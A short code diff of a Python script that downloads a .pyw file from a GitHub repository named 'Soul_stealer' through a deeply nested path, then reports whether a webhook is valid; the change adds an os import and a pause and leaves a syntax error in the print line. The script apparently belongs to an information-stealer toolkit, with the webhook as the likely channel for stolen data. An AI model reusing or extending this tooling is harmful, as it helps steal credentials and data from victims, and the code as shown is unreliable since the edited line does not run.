@@ -1,6 +1,7 @@
 import base64
 import json
 import requests
+import os
 
 r = requests.get('https://raw.githubusercontent.com/SLShinis/Soul_stealer/main/Soul%20Stealer/Components/process/index/index1/index/1/temp/index.pyw')
 
@@ -36,4 +37,6 @@ except (KeyError, json.decoder.JSONDecodeError):
 if j == None:
     print(f"\nInvalid Webhook.")
 else:
-    print(f"Valid webhook! ({j})")
+    print(f"Valid webhook! ({j})"\n)
+
+os.system("pause")
